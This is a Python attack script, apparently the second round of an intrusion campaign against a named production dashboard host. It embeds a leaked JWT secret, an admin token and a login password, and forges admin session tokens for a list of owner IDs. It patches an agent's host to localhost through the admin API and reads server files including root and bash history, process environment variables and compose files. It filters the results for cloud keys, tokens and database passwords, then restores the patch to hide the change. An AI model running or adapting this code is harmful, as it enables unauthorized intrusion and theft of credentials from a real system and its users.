#!/usr/bin/env python3
# i29136 round2: dashboard local-fallback host FS read (membership via owner UUIDs / real login)
import os, sys, json, time, base64, hmac, hashlib, subprocess, re
import urllib.parse as up

HOST = "dashboard.lumiiai.cn"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
JWT_SECRET = "w2I+OOqT9vkI12T3bNGwNp/2EA/L2H1ecwnWwA7UZ6A="
ADMIN_TOKEN = "6c73b13da5b9d09c642a3daa85be7d62d8025acfaebfdbe6"
def _b(s):
    if not isinstance(s, str):
        s = json.dumps(s, ensure_ascii=False, default=str)
    return base64.b64encode(s.encode("utf-8", "replace")).decode()
def R(k, v):
    print("R:%s:%s" % (k, _b(v)), flush=True)

def curl(args, timeout=30):
    try:
        r = subprocess.run(["curl", "-s", "-k", "-m", str(timeout)] + args,
                           capture_output=True, timeout=timeout + 15)
        return r.returncode, r.stdout
    except Exception as e:
        return -1, repr(e).encode()

def call(path, method="GET", body=None, session=None, admin=False, internal=False,
         timeout=25, maxlen=8000):
    url = "https://%s%s" % (HOST, path)
    args = ["--http2", "-A", UA, "-H", "Accept: application/json, text/plain, */*",
            "-w", "\n__CODE__%{http_code}"]
    if session: args += ["-H", "Cookie: session=" + session]
    if admin: args += ["-H", "Authorization: Bearer " + ADMIN_TOKEN]
    if internal: args += ["-H", "x-internal-token: " + ADMIN_TOKEN]
    if body is not None:
        args += ["-X", method, "-H", "Content-Type: application/json", "--data-binary", json.dumps(body)]
    elif method != "GET":
        args += ["-X", method]
    args += [url]
    rc, out = curl(args, timeout=timeout)
    txt = out.decode("utf-8", "replace"); code = ""; i = txt.rfind("__CODE__")
    if i >= 0:
        code = txt[i + 8:].strip()[:3]; txt = txt[:i]
    return {"code": code, "body": txt[:maxlen], "len": len(txt)}

def b64u(b):
    if isinstance(b, str): b = b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()

def forge(user_id, customer="aro", role="admin"):
    now = int(time.time())
    h = b64u(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")))
    p = b64u(json.dumps({"userId": user_id, "email": "p@x", "customer": customer,
                         "role": role, "iat": now, "exp": now + 86400 * 7}, separators=(",", ":")))
    sig = b64u(hmac.new(JWT_SECRET.encode(), (h + "." + p).encode(), hashlib.sha256).digest())
    return h + "." + p + "." + sig

def jload(s):
    try: return json.loads(s)
    except Exception: return None

def qp(p): return up.quote(p, safe="/")

def flist(aid, sess, path, timeout=30):
    r = call("/api/agents/%s/files?action=list&path=%s" % (aid, qp(path)), session=sess, timeout=timeout, maxlen=60000)
    j = jload(r["body"]); ents = []
    if isinstance(j, dict) and isinstance(j.get("entries"), list):
        for e in j["entries"][:300]:
            ents.append({"n": e.get("name"), "t": e.get("type"), "s": e.get("size")})
    return r["code"], ents, r["body"][:300]

def fread(aid, sess, path, timeout=30, maxlen=600000):
    r = call("/api/agents/%s/files?action=read&path=%s" % (aid, qp(path)), session=sess, timeout=timeout, maxlen=maxlen)
    j = jload(r["body"])
    if isinstance(j, dict) and "content" in j:
        return r["code"], j.get("content") or "", j.get("size"), j.get("path")
    return r["code"], None, None, r["body"][:300]

SENS = re.compile(r"(SECRET|TOKEN|PASS|PWD|KEY|DATABASE|MYSQL|POSTGRES|REDIS|DSN|ADMIN|LUMII|ZOOFI|PRIVATE|AKID|LTAI|AKIA|dckr_pat_|gho_|ghp_|github_pat_|BEGIN|0x[0-9a-fA-F]{40,64})", re.I)

def envlines(txt):
    out = []
    for seg in re.split(r"[\x00\n]", txt or ""):
        seg = seg.strip()
        if not seg: continue
        if len(seg) > 4000: seg = seg[:4000] + "…"
        if SENS.search(seg): out.append(seg)
    return "\n".join(out)

# ---------- P0 ----------
R("P0_health", call("/api/health", timeout=20)["body"][:300])

# ---------- P1 real login ----------
logins = {}
lr = call("/api/auth/login", method="POST",
          body={"identifier": "lumii-assistant-internal", "password": "Rm9OE6RbCmn1ZcQICX1ZTnyjohUi"},
          timeout=25, maxlen=4000)
lj = jload(lr["body"]) or {}
real_tok = lj.get("token")
uid = None
if real_tok:
    try:
        seg = real_tok.split(".")[1]
        seg += "=" * (-len(seg) % 4)
        pl = json.loads(base64.urlsafe_b64decode(seg))
        uid = pl.get("userId")
        logins["ide_user"] = pl
    except Exception as e:
        logins["decode_err"] = repr(e)
R("P1_login_ide", {"code": lr["code"], "body": lr["body"][:300], "payload": logins.get("ide_user")})
real_agents = []
if real_tok:
    r = call("/api/agents/list", session=real_tok, timeout=25, maxlen=40000)
    j = jload(r["body"])
    if isinstance(j, list):
        real_agents = [{"id": a.get("id"), "ip": a.get("ip"), "connected": a.get("connected")} for a in j]
    R("P1_ide_agents", {"code": r["code"], "agents": real_agents, "body": "" if real_agents else r["body"][:200]})
    R("P1_ide_me", call("/api/auth/me", session=real_tok)["body"][:300])

# ---------- P2 owner UUID membership ----------
OWNERS = ['4509e957-4909-11f1-ac43-525400595be1','4509f57e-4909-11f1-ac43-525400595be1',
 '4b4f439e-74f7-11f1-ac43-525400595be1','af0a2285-490f-11f1-ac43-525400595be1',
 'bc09d9cc-63b0-11f1-ac43-525400595be1','cef8ec22-4906-11f1-ac43-525400595be1',
 'e365313c-089f-4fef-8585-5c4080e5ce47','fc7c3730-4219-11f1-ac43-525400595be1',
 'fc7c871e-4219-11f1-ac43-525400595be1','fc7d463f-4219-11f1-ac43-525400595be1']
mm = {}
agent_members = {}
for o in OWNERS:
    r = call("/api/agents/list", session=forge(o), timeout=25, maxlen=40000)
    j = jload(r["body"]); lst = []
    if isinstance(j, list):
        for a in j:
            lst.append({"id": a.get("id"), "ip": a.get("ip"), "connected": a.get("connected")})
            agent_members.setdefault(a.get("id"), []).append(o)
    mm[o] = {"code": r["code"], "n": len(lst), "agents": lst[:40], "body": "" if lst else r["body"][:120]}
R("P2_owner_members", mm)
print("owner memberships with agents:", {k: v["n"] for k, v in mm.items() if v["n"]}, flush=True)

# ---------- P3 choose target ----------
CONN = ["agent-03d6cf98","agent-047f1d22","agent-0cf829f4","agent-10718fda","agent-3a85634b",
 "agent-3d032947","agent-4321c5a9","agent-48005081","agent-5db27600","agent-6c5c1781","agent-768c13da",
 "agent-8c6ac8b3","agent-acbc64ee","agent-aro-8a66259a","agent-bfeea504","agent-c2d569ac",
 "agent-d3650056","agent-ef0f5839","agent-fcf26d62","agent-tianyue-07f1a698","agent-tianyue-62f7fe42",
 "lumii-assistant-main","lumii-tianlu","lumii-vscode-claude"]
ADMIN_AGENTS = {}   # id -> ip  (from round1 knowledge; re-fetch to be safe)
r = call("/api/admin/agents", admin=True, timeout=30, maxlen=200000)
ja = jload(r["body"]) or {}
for a in ja.get("agents", []) or []:
    ADMIN_AGENTS[a.get("id")] = a.get("ip")

cands = []
for aid, us in agent_members.items():
    if aid in CONN: continue
    cands.append(("patch", aid, us[0], ADMIN_AGENTS.get(aid)))
# also: real login user's agents
for a in real_agents:
    if a["id"] not in CONN and a["id"] not in [c[1] for c in cands] and uid:
        cands.append(("patch", a["id"], uid, a["ip"]))
R("P3_candidates", cands[:8])

def do_reads(aid, sess):
    out = {}
    for p in ("/", "/opt", "/opt/lumii-prod", "/home", "/home/ubuntu", "/root",
              "/etc/systemd/system", "/var/lib/docker/containers", "/etc/crontab"):
        if p == "/etc/crontab":
            c, content, size, pth = fread(aid, sess, p, timeout=20)
            out["R:" + p] = {"code": c, "content": (content or "")[:3000], "err": None if content is not None else str(pth)[:150]}
            continue
        c, ents, raw = flist(aid, sess, p, timeout=35)
        out["L:" + p] = {"code": c, "entries": ents[:150], "raw": raw if c != "200" else ""}
        print("list %s -> %s (%d)" % (p, c, len(ents)), flush=True)
    # read known/guessable non-denied files
    for p in ("/proc/1/cmdline", "/proc/1/environ", "/etc/hostname", "/etc/environment",
              "/root/.bash_history", "/home/ubuntu/.bash_history",
              "/opt/lumii-prod/docker-compose.yml", "/proc/1/mountinfo"):
        c, content, size, pth = fread(aid, sess, p, timeout=30)
        if content is not None:
            if p.endswith("environ"):
                out["R:" + p] = {"code": c, "size": size, "grep": envlines(content), "raw_len": len(content)}
            elif p.endswith("mountinfo"):
                out["R:" + p] = {"code": c, "size": size, "content": content[:6000]}
            else:
                out["R:" + p] = {"code": c, "size": size, "content": content[:8000]}
        else:
            out["R:" + p] = {"code": c, "err": str(pth)[:200]}
        print("read %s -> %s" % (p, c), flush=True)
    # /proc pid enumeration
    c, ents, raw = flist(aid, sess, "/proc", timeout=40)
    pids = [e["n"] for e in ents if str(e.get("n", "")).isdigit()][:50] if c == "200" else []
    out["L:/proc"] = {"code": c, "npids": len(pids), "pids": pids}
    cmdlines = {}
    for pid in pids:
        c2, cmd, sz, pth = fread(aid, sess, "/proc/%s/cmdline" % pid, timeout=15, maxlen=20000)
        if cmd is None: continue
        cmdv = cmd.replace("\x00", " ").strip()
        cmdlines[pid] = cmdv[:250]
        if re.search(r"(node|next|tsx|lumii|assistant|center|caddy|docker|python|postgres|redis)", cmdv, re.I):
            c3, env, s3, p3 = fread(aid, sess, "/proc/%s/environ" % pid, timeout=25)
            if env is not None:
                out["E:" + pid] = {"cmd": cmdv[:250], "grep": envlines(env), "raw_len": len(env)}
    out["cmdlines"] = cmdlines
    return out

target = None
for kind, aid, u, ip in cands[:4]:
    sess = forge(u) if u != uid else real_tok
    rr = call("/api/agents/%s/files?action=list&path=%s" % (aid, qp("/")), session=sess, timeout=25, maxlen=2000)
    print("cand %s owner=%s pre=%s body=%s" % (aid, u, rr["code"], rr["body"][:120]), flush=True)
    if rr["code"] not in ("200", "503"):
        continue
    if kind == "patch":
        pr = call("/api/admin/agents", method="PATCH", admin=True,
                  body={"id": aid, "host": "127.0.0.1"}, timeout=25, maxlen=4000)
        R("P4_patch_%s" % aid, {"code": pr["code"], "body": pr["body"][:300], "orig": ip})
        print("patch %s -> %s" % (aid, pr["code"]), flush=True)
        if pr["code"] != "200":
            continue
    res = do_reads(aid, sess)
    R("P5_hostfs_%s" % aid, res)
    target = {"aid": aid, "user": u, "orig_ip": ip, "kind": kind}
    R("P5_target", target)
    if kind == "patch":
        pr2 = call("/api/admin/agents", method="PATCH", admin=True,
                   body={"id": aid, "host": ip or "0.0.0.0"}, timeout=25, maxlen=2000)
        R("P4_restore_%s" % aid, {"code": pr2["code"], "body": pr2["body"][:200]})
    break

R("P9_target", target)
print("DONE", flush=True)
